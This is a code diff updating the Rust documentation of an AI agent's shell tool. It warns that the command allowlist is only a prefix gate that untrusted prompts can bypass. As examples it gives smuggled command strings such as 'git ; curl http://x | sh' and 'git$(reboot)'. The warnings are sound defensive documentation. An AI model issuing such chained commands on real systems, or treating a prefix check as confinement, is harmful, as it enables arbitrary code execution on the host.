@@ -8,18 +8,31 @@
 //! built-in toolset ships. **Treat every [`ShellTool`] as a remote-code-execution
 //! primitive whose blast radius is whatever the host process can do.**
 //!
-//! - [`ShellTool::with_allowlist`] confines the tool to commands matching a
-//!   caller-supplied set of prefixes. This is the only configuration suitable
-//!   for any context where the model's input is not fully trusted.
+//! - [`ShellTool::with_allowlist`] narrows the tool to commands whose leading
+//!   prefix is in a caller-supplied set. This *raises the bar* over
+//!   [`without_allowlist`](ShellTool::without_allowlist) but is **not** a
+//!   confinement boundary and is **not** by itself sufficient for untrusted
+//!   input — see the prefix-gate caveat below.
 //! - [`ShellTool::without_allowlist`] runs **anything**. It exists for local
 //!   development only. Do not register it on a server, behind a public channel
 //!   adapter, or anywhere an untrusted prompt can reach it.
 //!
-//! The allowlist is a prefix gate, not a sandbox: it does not parse shell
-//! grammar, so an allowed prefix that invokes a shell built-in (`bash -c`, `env`,
-//! `sh`, `xargs`, …) can still pivot to arbitrary execution. Allowlist only
-//! genuinely-leaf commands, and pair the tool with the §11 capability + Cedar
-//! layers for defence in depth.
+//! **The allowlist is a prefix gate, not a sandbox — do not rely on it to
+//! confine untrusted input.** It matches the *start* of the command line and
+//! does not parse shell grammar, so an allowlisted prefix can chain straight to
+//! arbitrary execution: with `["git"]`, `git ; curl http://x | sh` and
+//! `git$(reboot)` both begin with `git` and are admitted, and an allowed prefix
+//! that invokes a shell built-in (`bash -c`, `env`, `sh`, `xargs`, …) pivots the
+//! same way. The `DESTRUCTIVE_PATTERNS` denylist catches a few notorious shapes
+//! but is explicitly not complete.
+//!
+//! Because `shell.run` deliberately runs the line through the system shell
+//! (composition — pipes, redirects, substitutions — is its purpose), the
+//! allowlist cannot be made a safe boundary without becoming a different tool.
+//! For an untrusted prompt, **do not** treat any `shell.run` configuration as a
+//! sandbox: gate it with the §11 cap-token + Cedar layers (which decide whether
+//! the capability may run at all), or use the sibling `terminal.exec` tool,
+//! which enforces a safe-charset allowlist and argv exec with no `/bin/sh -c`.
 
 use std::process::Stdio;
 use std::time::Duration;
@@ -152,8 +165,15 @@ impl ShellTool {
     /// Each entry is one or more `|`-separated command prefixes (e.g.
     /// `"git|cargo"` or `"ls"`). A command is permitted when it equals a prefix
     /// or begins with one followed by whitespace. A command matching nothing is
-    /// refused with [`ToolError::Denied`]. This is the only construction
-    /// appropriate where the prompt is not fully trusted.
+    /// refused with [`ToolError::Denied`].
+    ///
+    /// This is a **prefix gate, not a sandbox**: because the command still runs
+    /// through the system shell, an allowlisted prefix can chain to arbitrary
+    /// execution (`with_allowlist(["git"])` admits `git ; <anything>`). It is
+    /// strictly better than [`without_allowlist`](Self::without_allowlist), but
+    /// do not rely on it alone to confine an untrusted prompt — gate the
+    /// capability with cap-token + Cedar, or prefer `terminal.exec`. See the
+    /// module-level security warning.
     #[must_use]
     pub fn with_allowlist(commands: Vec<String>) -> Self {
         Self::build(Allowlist::Patterns(commands))
